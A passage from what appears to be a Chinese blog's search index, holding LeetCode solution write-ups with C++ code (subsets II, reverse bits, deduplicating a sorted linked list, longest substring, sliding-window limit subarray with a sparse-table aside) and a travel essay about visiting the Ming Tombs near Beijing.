负雪明烛.【负雪明烛】动画题解，帮助理清思路[EB/OL].2021-04-06\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-array-ii/solution/fu-xue-ming-zhu-dong-hua-ti-jie-bang-zhu-yrx5/\n","date":"2021-04-06T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%94%99%E9%A2%98%E6%9C%AC-leetcode80.-%E5%88%A0%E9%99%A4%E6%9C%89%E5%BA%8F%E6%95%B0%E7%BB%84%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E9%A1%B9-ii/","title":"错题本 | LeetCode80. 删除有序数组中的重复项 II"},{"content":"前奏 上周便计划着利用清明假期出门游玩，而一周劳累之后，游兴顿起，再难收拾。昨天到了约好的时间，舍友却没办法从床上起来，我无心再作拖延，独自一人踏上了去往明十三陵的路程。\n此前并未做详细的路线调研，只觉得既然昌平线上有十三陵站，总不会骗我才是。在十三陵站下车，走出站门赫然是一片荒芜闭塞的小地方。十三陵，到现在还是切切实实的郊区。我对北方农村一直以来的热情在此刻也被一并激发出来，便无视了地铁站口那许多的揽客司机，独自向着十三陵的方向走去。\n天气实在太好了。晴空万里无一物，吹面不寒杨柳风。北方的春天与南方大不相同，经历了无比残酷的严寒之后，这个世界开始倾其所有温柔来哺育万物。北方的农村也与南方大不相同，它给我的感觉是更为开阔、更为肃穆，杨柳的阴影在老屋的硬山顶上流动，破碎的石板路和宽阔的柏油路交替述说着这一片村落的兴衰。我的家乡——闽南的村落我是很喜欢的，大抵由于宗法的盛行，邻舍之间的布局更加的紧密，总是给人一种热闹而团结的氛围，但从气质而言，则稍逊于此处了。\n沿着涧头村的村道走着，走上了昌赤路，十三陵的地界已然在我的正前方了。一路走过，所遇到的骑行者不可胜数，颇觉首都的文体活动确实是非常发达，不禁羡慕起了生长于此地的人们，在他们最美好的年华里，每年都能在这么舒爽的春气中驰骋在平整的乡道上，探访那些历史悠久的地方。\n沿着昌赤路直行数十分钟，到达了大宫门附近。在路边的农家餐馆中随便应付，稍作歇息便开启了游览十三陵的进程。大宫门本是神道的入口，却由于景区的施工而暂时封闭。我只得重新回到马路，继续朝着神道的方向走去。\n神道 神道是帝王和百官前往祭祀的起点，他们总要在这么一条长而不单调的道路上行进着，酝酿出对先祖的无比真挚的敬意来。\n从入门开始便显出了庄重。倘若帝王也于清明来祭拜祖先，则我们看到的景象是一样的：迈过了门槛，走出深厚而低矮的门，便是天地开阔、杨柳轻舞、石像规整、地砖严密的神道。古人确乎是事死如生，先帝所喜闻乐见的瑞兽、诤臣，也都要化作了石像，在这条长长直直的神道上永久地陪伴着他们的魂灵。凡此一类表征性的东西，是否能使先帝安息倒是还不可知，能使后来的拜祭者产生出自足而凝重的情绪恐怕是一定的了。\n也许在几百年前的某个清明，某位帝王就这么静默地走在这条神道上，追思先帝的种种，也冥想着关于天下百姓的种种。\n亦也许在几百年前的某个清明，某位帝王带着他的妃嫔，脚步轻快地在这里前行，赶紧完成了祭祀，还有盛大的宴会在等着他呢。\n定陵 从神道出去，距离真正的陵寝还有很远的距离。我在昌赤路上继续行进了几百米，打开地图一看，恐怕几公里的路程用脚走下来，时间的花费是吃不消的了。在昌平胡庄站上了公交，在拥挤的道路上走走停停，总算是来到了定陵。\n定陵是万历皇帝的陵寝，一位几十年不上朝的皇帝，对于自己身后的住所倒是非常上心。宫殿的规制还是很严格的，从入门开始，过祾恩门、祾恩殿（均被焚毁），来到棂星门和明楼。明楼脚下的两个偏殿中正在展出定陵地宫出土的文物，我在展厅内融入了一个导游团，听导游讲解定陵的故事。\n建国初期，考古专家们本欲发掘长陵（永乐皇帝朱棣的陵寝），但帝陵规制巨大，长陵又是其中最大，专家中没有一人有过发掘此类陵寝的经验。经过探讨，最终决定发掘规制较小的定陵，为长陵的发掘积攒经验。在发掘初期，专家在一条探沟中找到了明楼侧面的地下隧道，沿着此隧道的走向挖掘第二条探沟；在第二道探沟处找到了一块指路石碑，根据石碑的记载深挖第三道探沟，找到了地宫的大门。进入地宫，其大门竟是从内部顶住的，专家吓了一跳，认为这说明了当时有活人殉葬——活人从内部将大门锁上之后，在地宫中自决。然而史料记载在万历之前很久就已经废除了活人殉葬的制度，故此内部的门封，应是用了某些物理的办法来实现。打开地宫，果真干干净净，没有尸骨。他们逐步向内发掘，见到了万历皇帝宝座、孝端皇后宝座和孝靖皇后宝座；后殿是三具棺椁，左偏殿是一块石台，当中一处长方形开口，是为金井，乃是整座左偏殿的风水穴眼。后殿的金井正在万历皇帝棺椁下方，故无法目睹；如此穴眼是地宫建筑的中心，是风水最为关键的地方，古人相信，这类穴眼能使得帝王死后的元气继续护佑子孙万世。\n我们是从左偏殿进入地宫的，先瞧了瞧金井，后进入正殿看了宝座，后见了三具棺椁，最后从第三道探沟中经过地宫大门而出。地宫有一千多平方米，加上先前的许多建筑，可算得是一项很大的工程了。帝王将棺椁置于金井之上，希望自己的龙气荫及子孙，永保江山，而不知自己的一座陵寝使得子民付出了多少，使得国家付出了多少。十三座气势磅礴的陵寝，是十三个朝代人民的血汗和牺牲；皇家的金井玄学，只是希望皇权永固，而非希望子民安乐。或不如说，从帝王的生前到身后，整个无比高级、无比精细的礼制体系，本就建立在人民的付出之上，基于压榨人民的江山永固的愿望，本身就无法实现，江山是不可避免地会丢掉的。\n很有趣的是，地宫中三座宝座的面前都摆着一个青花瓷缸，内部原本是盛满了灯油，点着长明灯的。那微弱的火焰自然无法在这地下27米的地方长明，历经几百年的黑暗，后人在这里扯上了电线，点亮了电灯，一切清晰如昼，地宫算是真正地明亮了起来。\n从地宫的正门上明楼，这是一座完全用石质材料的建筑，故而未受战火的侵蚀。紫禁城用木质，陵寝明楼用石质，似乎相比于振兴民族、不朽于史册，还是自己陵寝的不朽更为重要一些。\n在明楼见到了一块巨大的石碑，相当于是墓碑了，上书：大明神宗显皇帝之陵。在明楼上，视野极开阔，在此前所提到的绝好天气里，江山真是无比多娇。我想，帝王死后有灵，从地宫出来在这明楼上看看，现今的景象大抵是不会令其失望的。然而，亦是同样的视角，恐怕也能见到农民的起义、外寇的入侵、人民的自主、新中国的旧貌新颜。中国人在这样的历史发展中站了起来，而幻想着江山永固的帝王恐怕就不会那么高兴了。\n长陵 从定陵出来，还得再乘十来分钟的公交车才能到达长陵。相较于定陵，长陵的规制更为宏大。战火并未使此地受损，我由此得以见到祾恩门、祾恩殿的样子。\n大抵可以将祾恩门、祾恩殿看作是太和门、太和殿，是皇帝于另一个世界上朝的地方。经典的重檐庑殿顶，檐角九走兽，无一不在显示皇权的威严。祾恩殿中立着一座很高的朱棣坐像，殿内展出的是定陵出土的文物（仿品），也没有什么好讲。我在这里又融入了第二个导游团，始觉得游览时有一个好导游是能学到很多的。\n出祾恩殿，来到棂星门和明楼。定陵发掘之后效果并不非常理想，由于长陵规制更为宏大，国家禁止了对帝陵的发掘。故长陵没有地宫可以参观，我们上明楼，在导游的讲解下才觉察到此处的玄妙所在。\n从长陵明楼望去，正面远处是昌平凤山，左面是莽山，右面是虎峪，后面是玄武山；四象齐聚，风水之祥瑞可见一斑。长陵是十三陵中的祖陵，风水尤佳，除了四象之外，多处水流汇集于此，取传统的“流水聚财”之意。依据风水，坐西北朝东南才是最佳的卦位，长陵朝向偏离南北九度，紫禁城朝向偏离南北六度，皆出于此。\n与定陵类似，长陵也有一块石碑，上书：大明成祖文皇帝之陵。“成祖”是庙号，有功称为祖，有德称为宗，原本朱棣的庙号为高宗，后世一位皇帝（记不清了）认为朱元璋开创大明基业有功，而朱棣稳固大明基业有功，亦可称之为“祖”，于是，大明成为历史上同时具备“明高祖”和“明成祖”两位祖的王朝。\n当时改宗为祖，石碑并未重新建造，而是在原本的石碑之外套上一层木质外壳。在嘉靖年间，一道天雷击中此处，木石俱毁。皇帝本身也是一位无功无德的人，认为是上天发怒，怪罪于己；此时一位大臣说：此前改宗为祖，并未重修石碑，今日天雷毁之，乃是令我们重修石碑之意，皇帝大喜，遂重修石碑，就是现今的这一块。\n长陵的石碑立此也几百年了，我对于这座明楼的想法，与定陵无异。从长陵出来时，导游跟游客打趣说：长陵风水最佳，而后逐个逐个的陵寝风水就渐渐差了，故大明国势也逐渐衰微。我想这确实有趣，但恐怕无理，哪有祖宗陵墓不占据上佳风水，而将之留给后世的道理呢？且若如此，则长陵占个风水最差的地方，后面的陵寝去寻更好的风水，则国运日强，统治延绵；每朝都如此做，中国岂有如此多的风水上佳之地？最终恐怕还是上升到了极限，要渐渐落下的。\n实际上我来教帝王选风水罢，世上本无绝佳的风水，人民就是最好的风水。\n","date":"2021-04-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E6%B8%B8%E6%98%8E%E5%8D%81%E4%B8%89%E9%99%B5%E8%AE%B0/","title":"游明十三陵记"},{"content":"题目链接：https://leetcode-cn.com/problems/subsets-ii/\n题目 给你一个整数数组 nums ，其中可能包含重复元素，请你返回该数组所有可能的子集（幂集）。\n解集 不能 包含重复的子集。返回的解集中，子集可以按 任意顺序 排列。\n示例1\n输入： nums = [1,2,2]\n输出： [[],[1],[1,2],[1,2,2],[2],[2,2]]\n示例2\n输入： nums = [0]\n输出： [[],[0]]\n分析 三个月之前WA过的题，在每日一题里碰见了，而我还是思考了很久 😢\n原始数组中可能包含重复元素，则对于重复元素的考虑就尤为重要，一般来说，重复元素对于子集的贡献也有重复。\n我们不妨考虑进行以下的模拟，对于一个 不包含重复元素 的集合 [1, 2, 3] ，如何求得它的所有子集呢？\n首先，答案中包含一个空集。\n首先取得第一个元素，将其与当前答案中的所有集合拼接，放入答案中；\n考虑第二个元素，将其与当前答案中的所有集合拼接，放入答案中；\n第三个元素同理。\n示意 在这个环节中，由于答案是在不断地增长的，我们只需要用一个变量保存添加元素之前的答案集合大小即可。\n这种做法的正确性是 不会证明 理所当然的。\n实际上，根据这种做法我们可以AC掉 LeetCode78. 子集 。\n// LeetCode 78 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsets(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;int\u0026gt; tmp; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; res.push_back(tmp); // empty set for (auto n : nums) { int sze = res.size(); for (int i = 0; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(n); res.push_back(tmp); } } return res; } }; 那么问题在于，本题的原始数组是可以重复的。\n对于重复数据，首先可以进行一波排序，使得我们比较方便地进行判重。\n在上面的做法中，重复数据产生的答案会有相当一部分重复，我们考虑集合 [1, 2, 2] ：\n对集合[1,2,2]进行同样的操作 可以看到，对于重复出现的 2 来说，它不需要再与 [] 和 [1] 进行合并。\n那么，重复数据在哪里能够产生贡献呢？\n答案就是 上一步新加入的子集 ！\n重复数据与上一步加入的子集合并 由此，形势就变得比较明朗了。对于非重复的数据，与目前拥有的所有子集进行合并；对于重复的数据，只与上一步加入的子集进行合并。\n如何只获取上一步加入的子集呢？在上面给出的代码中，我们使用 sze 来记录答案集合中原本的大小。很巧的，上一步加入的子集在答案集合中的下标就从 sze 开始。\n于是，使用一个变量 start 来记录本轮需要合并的子集起点，当当前的数是重复的， start 就被设置为 sze ，然后更新新的 sze ，否则 start 直接设置为 0 。\nAC代码 class Solution { public: vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; subsetsWithDup(vector\u0026lt;int\u0026gt;\u0026amp; nums) { vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; res; vector\u0026lt;int\u0026gt; tmp; res.push_back(tmp); int start, sze; sort(nums.begin(), nums.end()); for (int idx = 0; idx \u0026lt; nums.size(); idx++) { if (idx \u0026gt; 0 \u0026amp;\u0026amp; nums[idx] == nums[idx - 1]) { start = sze; } else { start = 0; } sze = res.size(); for (int i = start; i \u0026lt; sze; i++) { tmp = res[i]; tmp.push_back(nums[idx]); res.push_back(tmp); } } return res; } }; Performance 小结 三个月前WA掉的题目在今天重新来到我的面前，经过一番思索之后能够独立地将其做出来了。人生点滴进步大抵皆见于此类细节之中。题解基本采用回溯的办法，在此没有花费精力予以研究。亦因此本文无所参考，便有，也是此三月中所见的某篇文章，回忆不清矣。\n","date":"2021-03-31T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode90.-%E5%AD%90%E9%9B%86-ii/","title":"难题本 | LeetCode90. 子集 II"},{"content":"题目链接：https://leetcode-cn.com/problems/reverse-bits/\n一道简单题，却能引出一个无比骚包的操作。此法前所未见，独自亦难想出，因此大抵也算是难的。\n题目 颠倒给定的 32 位无符号整数的二进制位。\n示例1\n输入： 00000010100101000001111010011100\n输出： 00111001011110000010100101000000\n解释： 输入的二进制串 00000010100101000001111010011100 表示无符号整数 43261596， 因此返回 964176192，其二进制表示形式为 00111001011110000010100101000000。\n示例2\n输入： 11111111111111111111111111111101 输出： 10111111111111111111111111111111 分析 易得简单暴力的32次循环法，在此不表，详见AC代码1。唯有一点值得注意：先加最低位再将 res 移位的时候，只能移动 31 次，否则最高位将溢出。因此，AC代码1中只取31次循环，而将最后一位置于循环外。\n对于一个首尾对换的操作，我们可以使用分治的思路。\n考虑对于最大的32位二进制，将前16位与后16位对换。\n考虑高低的16位，将每一部分中的高8位与低8位对换。\n如此进行······\n分治 那么，我们如何做到这种形式的对换呢？\n不妨以8位二进制为例，对于一个八位二进制数 1011 0011 ，我们首先需要将其高低四位进行对换。示意如下：\nStep 1 对于一个二进制数，我们可以很简单地使用如下办法取得它的高低四位：\nhighBits = 0x10110011 \u0026amp; 0x11110000 = 0x10110011 \u0026amp; 0xf0\nlowBits = 0x10110011 \u0026amp; 0x00001111 = 0x10110011 \u0026amp; 0x0f\n然后根据图中所示，高四位移至低四位，低四位移至高四位，即分别采取右移和左移的办法：\nlowerPart = highBits \u0026gt;\u0026gt; 4\nupperPart = lowBits \u0026lt;\u0026lt; 4\n最后一步就非常简单了，两部分按位取或即可：\nfinal = lowerPart | upperPart\n如此一来，我们实现了高低四位的对换。\n紧接着，对于两部分4位来说，每4位中需要进行高低二位的对换。示意如下：\nStep 2 在这里，我们的两部分分别可以表示如下：\nfinal = higherPart | lowerPart = (origin \u0026amp; 0x33 \u0026lt;\u0026lt; 2) | (origin \u0026amp; 0xcc \u0026gt;\u0026gt; 2)\n最后，在每一个二位中进行高低一位的对换，示意图略。\n8位如此解决，16位当然也可，32位亦然。\nAC代码1 class Solution { public: uint32_t reverseBits(uint32_t n) { uint32_t res = 0; // 注意此循环的条件 for (int i = 0; i \u0026lt; 31; i++) { res += (n \u0026amp; 1); res = res \u0026lt;\u0026lt; 1; n = n \u0026gt;\u0026gt; 1; } res += (n \u0026amp; 1); return res; } }; AC代码2 class Solution { public: uint32_t reverseBits(uint32_t n) { // 注意！由于移位操作的优先级高于按位与，需要在与操作部分添加括号 n = ((n \u0026amp; 0xffff0000) \u0026gt;\u0026gt; 16) | ((n \u0026amp; 0x0000ffff) \u0026lt;\u0026lt; 16); n = ((n \u0026amp; 0xff00ff00) \u0026gt;\u0026gt; 8) | ((n \u0026amp; 0x00ff00ff) \u0026lt;\u0026lt; 8); n = ((n \u0026amp; 0xf0f0f0f0) \u0026gt;\u0026gt; 4) | ((n \u0026amp; 0x0f0f0f0f) \u0026lt;\u0026lt; 4); n = ((n \u0026amp; 0xcccccccc) \u0026gt;\u0026gt; 2) | ((n \u0026amp; 0x33333333) \u0026lt;\u0026lt; 2); n = ((n \u0026amp; 0xaaaaaaaa) \u0026gt;\u0026gt; 1) | ((n \u0026amp; 0x55555555) \u0026lt;\u0026lt; 1); return n; } }; Performance 参考资料 [1] 负雪明烛.「循环」与「分治」解法[EB/OL].2021-03-29\nhttps://leetcode-cn.com/problems/reverse-bits/solution/fu-xue-ming-zhu-xun-huan-yu-fen-zhi-jie-hoakf/\n","date":"2021-03-29T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode190.-%E9%A2%A0%E5%80%92%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%BD%8D/","title":"难题本 | LeetCode190. 颠倒二进制位"},{"content":"题目链接：https://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/\n题目 存在一个按升序排列的链表，给你这个链表的头节点 head ，请你删除链表中所有存在数字重复情况的节点，只保留原始链表中 没有重复出现 的数字。\n返回同样按升序排列的结果链表。\n示例1\n输入： head = [1,2,3,3,4,4,5]\n输出： [1,2,5]\n示例2\n输入： head = [1,1,1,2,3]\n输出： [2,3]\n数据范围\n链表中节点数目在范围 [0, 300] 内 -100 \u0026lt;= Node.val \u0026lt;= 100 题目数据保证链表已经按升序排列 分析 在 有序 的链表中去重，表示我们理论上只需要进行一次遍历即可。\n而两次遍历的办法则更为简单，也是最初浮现在我脑海中的念头。考虑到链表节点的数据范围在 [-100, 100] 区间中，我们在第一次遍历的过程中记录每个数值出现的次数，而在第二次遍历过程中考虑下一个节点（的数值）是否应该存在于最终的结果中即可。\n当然，两次遍历的办法随着节点数据范围的变大很快就失效了，投机不可取，一次遍历的办法如何实现呢？\n在有序的数组中取得一段相同元素的子数组，直接考虑滑动窗口。\n我们使用一个指针，指向窗口 左边界的左邻居 ，使用两个指针维护窗口的左右边界。当窗口右边界数值等于左边界数值时，窗口向右扩张，否则进行一定的更新操作。\n容易想象，在不发生重复的情况下，窗口的大小（right - left）始终为 1 ，而发生重复的时候整段窗口需要全部从链表上删除。\n窗口中无重复 窗口中有重复 需要注意，由于我们的规则是：right指针指向的元素与 left 指向的元素不同时，才停止窗口的扩张，进入更新操作，因此，right 指针指向的元素并不属于窗口本身。\n那么如何更新呢？\n我们注意到，当 right == left-\u0026gt;next 时，即 winSize == 1 时，不需要对窗口中的元素进行操作，则将三个指针往后移动，直接进入下一步的窗口更新环节即可。\n窗口大小为1时的更新办法 而窗口大小大于1时，就比较有趣了。我们直接将窗口 左边界的左邻居 ，即此处的 Out-left 指向的元素链向 right 元素，这样就直接跳过了整个重复的部分，示意如下：\n窗口大小不为1时的更新办法 到现在为止，我们已经完成了在正常情况下的遍历更新策略，但是循环遍历的边界条件很重要，且题目要求返回结果链表的头结点，这个头结点该如何确定也很重要。\n首先是循环条件，我们使得 right 指针指向最后一个节点时结束循环，因此 while (right-\u0026gt;next) 。\n在我的首次提交中，使用了比较复杂的逻辑来判断头结点是否已经出现。当符合条件的头结点还没有出现时，对于当前的 right 指针，当它的右邻居值与它不同，则说明当前这个 right 指向的节点是不用删除的，可以作为结果链表的头结点。\n同理进行 Out-left 指针的判断。\nAC代码1 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* lefleft = NULL; ListNode* left = head; ListNode* right = head; ListNode* ret = NULL; int winSize = 1; while (right-\u0026gt;next) { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl; right = right-\u0026gt;next; if (right-\u0026gt;val == left-\u0026gt;val) { winSize++; } else { // cout \u0026lt;\u0026lt; right-\u0026gt;val \u0026lt;\u0026lt; endl; if (winSize != 1) // delete the window { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl; if (!lefleft) // do not have previous node { if (!right-\u0026gt;next || right-\u0026gt;val != right-\u0026gt;next-\u0026gt;val) { ret = right; lefleft = right; } } else { lefleft-\u0026gt;next = right; } left = right; winSize = 1; } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } } } // right points to the last node if (winSize != 1) // delete the window { // cout \u0026lt;\u0026lt; \u0026#34;WinSize: \u0026#34; \u0026lt;\u0026lt; winSize \u0026lt;\u0026lt; endl; if (lefleft) { lefleft-\u0026gt;next = NULL; } } else { ret = (ret == NULL ? left : ret); lefleft = left; left = right; } return ret; } }; Performance1 分析2 上面的代码显然由于引入了头结点的逻辑而变得非常臃肿，能否对其进行优化呢？\n我们引入一个哑结点 dummy ，它作为头结点之前的一个节点，初始化为 dummy-\u0026gt;next = head。\n此外，滑动窗口的思想实际上在此过于复杂，因为我们只需要判断窗口的大小是否为1，则只需要考虑 right 是否等于 left-\u0026gt;next 即可。\n于是一种较为简洁的思想诞生了：使用 pre 、 now 、 nxt 三个指针来标识前一个节点、现在的节点和下一个节点。还是按照之前的办法对 now （即之前的 left ）和 nxt （即之前的 right ）进行更新。由于 pre 被初始化为 dummy 节点，故一轮遍历之后，dummy-\u0026gt;next 所指向的节点一定是第一次符合条件的节点，为返回的链表头部。\nAC代码2 /** * Definition for singly-linked list. * struct ListNode { * int val; * ListNode *next; * ListNode() : val(0), next(nullptr) {} * ListNode(int x) : val(x), next(nullptr) {} * ListNode(int x, ListNode *next) : val(x), next(next) {} * }; */ class Solution { public: ListNode* deleteDuplicates(ListNode* head) { if (!head || !head-\u0026gt;next) return head; ListNode* dummy = new ListNode(0); dummy-\u0026gt;next = head; ListNode* pre = dummy; ListNode* now = head; ListNode* nxt = head-\u0026gt;next; while (nxt) { if (nxt-\u0026gt;val == now-\u0026gt;val) { nxt = nxt-\u0026gt;next; } else { if (nxt == now-\u0026gt;next) { pre = now; now = nxt; nxt = nxt-\u0026gt;next; } else { pre-\u0026gt;next = nxt; now = nxt; nxt = nxt-\u0026gt;next; } } } // 注意此处细节，循环结束之后进行最后一次判断 if (nxt != now-\u0026gt;next) { pre-\u0026gt;next = NULL; } return dummy-\u0026gt;next; } }; Performance2 参考资料 [1] 力扣官方题解.删除排序链表中的重复元素 II[EB/OL].2021-03-24\nhttps://leetcode-cn.com/problems/remove-duplicates-from-sorted-list-ii/solution/shan-chu-pai-xu-lian-biao-zhong-de-zhong-oayn/\n","date":"2021-03-25T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode82.-%E5%88%A0%E9%99%A4%E6%8E%92%E5%BA%8F%E9%93%BE%E8%A1%A8%E4%B8%AD%E7%9A%84%E9%87%8D%E5%A4%8D%E5%85%83%E7%B4%A0-ii/","title":"难题本 | LeetCode82. 删除排序链表中的重复元素 II"},{"content":"题目链接： https://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/\n题目 给你一个字符串 s 和一个整数 k ，请你找出 s 中的最长子串， 要求该子串中的每一字符出现次数都不少于 k 。返回这一子串的长度。\n示例1\n输入： s = \u0026ldquo;aaabb\u0026rdquo;, k = 3\n输出： 3\n解释： 最长子串为“aaa”，其中”a“重复了3次\n示例2\n输入： s = “ababbc”, k = 2\n输出： 5\n数据范围\n1 \u0026lt;= s.length \u0026lt;= 104 s 仅由小写英文字母组成 1 \u0026lt;= k \u0026lt;= 105 分析 没有任何思路，参照题解的分治法将此题解出，稍作记录。\n首先，对于 s 中的所有字符，我们可以统计它们出现的次数，对于所有出现次数小于 k 的字符，答案中一定不包含它。\n则我们只需要考虑这些字符之外的子串。我们可以遍历整个字符串，当某个字符出现次数小于 k 的时候，将其位置记录下来；我们凭借这些位点，可以将原字符串 s 分割成许多个子串，然后按照相同的办法去处理这些子串即可。\n按照这样的分析，整个题目可以使用递归的写法来实现分治算法。\nAC代码 class Solution { public: int longestSubstring(string s, int k) { if (s.size() \u0026lt; k) return 0; // 统计频数 vector\u0026lt;int\u0026gt; cnt(26, 0); for (auto ch : s) cnt[ch - \u0026#39;a\u0026#39;]++; // 记录分割位点 vector\u0026lt;int\u0026gt; split; for (int i = 0; i \u0026lt; s.size(); i++) { if (cnt[s[i] - \u0026#39;a\u0026#39;] \u0026lt; k) { split.push_back(i); } } if (split.size() == 0) // 无需分割 return s.size(); int start = 0; // 当前子串的起点 int res = 0; // 最终答案 for (auto pos : split) { // string.substr(pos, len) // 从位置pos开始的连续len个字符 res = max(res, longestSubstring(s.substr(start, pos - start), k)); start = pos + 1; } if (start != s.size() - 1) // 对于最后一个子串 { res = max(res, longestSubstring(s.substr(start, s.size() - start), k)); } return res; } }; 参考资料 [1] 力扣官方题解.至少有K个重复字符的最长子串[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/zhi-shao-you-kge-zhong-fu-zi-fu-de-zui-c-o6ww/\n[2] 负雪明烛.借本题帮助大家理解递归[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/jie-ben-ti-bang-zhu-da-jia-li-jie-di-gui-obla/\n[3] ffreturn.C++超100%的分治解法[EB/OL].2021-02-27\nhttps://leetcode-cn.com/problems/longest-substring-with-at-least-k-repeating-characters/solution/cchao-100de-fen-zhi-jie-fa-by-ffreturn-uygu/\n","date":"2021-02-27T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode395.-%E8%87%B3%E5%B0%91%E6%9C%89-k-%E4%B8%AA%E9%87%8D%E5%A4%8D%E5%AD%97%E7%AC%A6%E7%9A%84%E6%9C%80%E9%95%BF%E5%AD%90%E4%B8%B2/","title":"难题本 | LeetCode395. 至少有 K 个重复字符的最长子串"},{"content":"定场句：人一能之，己百之；人十能之，己千之。果能此道矣，虽愚必明，虽柔必强。\n题目链接：https://leetcode-cn.com/problems/longest-continuous-subarray-with-absolute-diff-less-than-or-equal-to-limit/\n题目 给你一个整数数组 nums ，和一个表示限制的整数 limit，请你返回最长连续子数组的长度，该子数组中的任意两个元素之间的绝对差必须小于或者等于 limit 。\n如果不存在满足条件的子数组，则返回 0 。\n示例1\n输入： nums = [8,2,4,7], limit = 4\n输出： 2\n解释： 所有子数组如下：\n[8] 最大绝对差 |8-8| = 0 \u0026lt;= 4.\n[8,2] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[8,2,4] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[8,2,4,7] 最大绝对差 |8-2| = 6 \u0026gt; 4.\n[2] 最大绝对差 |2-2| = 0 \u0026lt;= 4.\n[2,4] 最大绝对差 |2-4| = 2 \u0026lt;= 4.\n[2,4,7] 最大绝对差 |2-7| = 5 \u0026gt; 4.\n[4] 最大绝对差 |4-4| = 0 \u0026lt;= 4.\n[4,7] 最大绝对差 |4-7| = 3 \u0026lt;= 4.\n[7] 最大绝对差 |7-7| = 0 \u0026lt;= 4.\n因此，满足题意的最长子数组的长度为 2 。\n示例2\n输入： nums = [10,1,2,4,7,2], limit = 5\n输出： 4\n分析 实际上这道题的思路并不难。一句话：子数组中 任意两个 元素之间的绝对差小于等于 limit 等价于子数组中 最大最小值 的绝对差小于等于 limit。\n则原问题就转化为了求 区间最值 的问题，这类问题可以使用 线段树 来解决，但是在这题的情境下属于杀鸡用牛刀，而且我还不会线段树。\n考虑STL中的各种数据结构，是否有一种数据结构能在短时间内得到一组数据的最大最小值呢？答案就是 map/set/multimap/multiset。\n对于这四类容器，其底层均使用 红黑树 来进行实现。红黑树是一种有序的数据结构，我们使用这四类容器的迭代器进行顺序遍历就能得到容器中数据的有序状态。\n我们只希望获得最大最小值，则不必进行遍历，只需要取容器的首尾元素即可，使用容器自带的成员函数begin()和rbegin()就能实现。\n对于这道题，数据可能重复，故我们使用一个multiset来保存当前滑动窗口中的数据。每次窗口右边界增加的时候，把新来的元素放入集合中，然后判断当前窗口是否满足条件（最大 - 最小 \u0026gt; limit），若满足，更新最大窗口值，否则移动左边界，同时要把原来左边界上的元素从集合中去除。\n这里只有几点需要注意：\n使用s.begin()和s.rbegin()获得当前窗口的最值； 使用s.erase(s.find(nums[left]))才能删除左边界元素而不删除其他同数值的元素。 AC代码1 class Solution { public: int longestSubarray(vector\u0026lt;int\u0026gt;\u0026amp; nums, int limit) { multiset\u0026lt;int\u0026gt; s; int left = 0; int right = 0; int maxLen = 0; while (right \u0026lt; nums.size()) { s.insert(nums[right]); // cout \u0026lt;\u0026lt; *s.rbegin() \u0026lt;\u0026lt; \u0026#34; \u0026#34; \u0026lt;\u0026lt; *s.begin() \u0026lt;\u0026lt; endl; while (*s.rbegin() - *s.begin() \u0026gt; limit) { s.erase(s.find(nums[left])); left++; } // cout \u0026lt;\u0026lt; right \u0026lt;\u0026lt; \u0026#34; ~ \u0026#34; \u0026lt;\u0026lt; left \u0026lt;\u0026lt; endl; maxLen = max(maxLen, right - left + 1); right++; } return maxLen; } }; Performance1 ST表 上面的解法简直无法令人满足啊，一个那么高端的区间最值问题就简单地用STL底层红黑树做出来了？？\n搜索引擎启动，果不其然，早就有经典的求解区间最值的算法了。\nST表（Sparse Table）是用于解决RMQ（Range Maximum/Minimum Query）的经典算法，它的主要思想是将一个区间的最值转化为两段子区间的最值。它的数据结构非常特别（在我看来），使用 table[i][j] 来表示从 nums[i] 开始，连续 2^j 个元素的最值。\n文字的表现力不够，我们看下图所示的长度为 8 的数组：\nArray 按照上述的规则，table[0][2]就表示从nums[0]开始，连续2^2 = 4个元素的最值，也就是这一段的最值：\n0 ~ 3 同理，table[4][2]就表示从nums[4]开始，连续4个元素的最值，也就是这一段的最值：\n4 ~ 7 而table[0][3]就很有意思了，它表示从nums[0]开始，连续8个元素的最值，也就是这一段的最值：\n0 ~ 7 你是否发现了什么？\n我们欲求table[0][3]，而它可以由table[0][2]和table[4][2]这两段的最值得到：\n最值关系 以求最大值为例，不失一般性地有：\ntable[i][j] = max(table[i][j - 1], table[i + pow(2, j - 1)][j - 1])\n看似很长，实际上就是将待求区间拆分成两个子段，长度都是2 ^ (j - 1)。\n根据此表达式来写代码，只需要在外层遍历 j ，内层遍历 i 即可。考虑几个临界条件：\n外层的 j 使得 2 ^ j 能够覆盖到整个数组为止，故使用ceil函数将对数值向上取整； 内层的 i 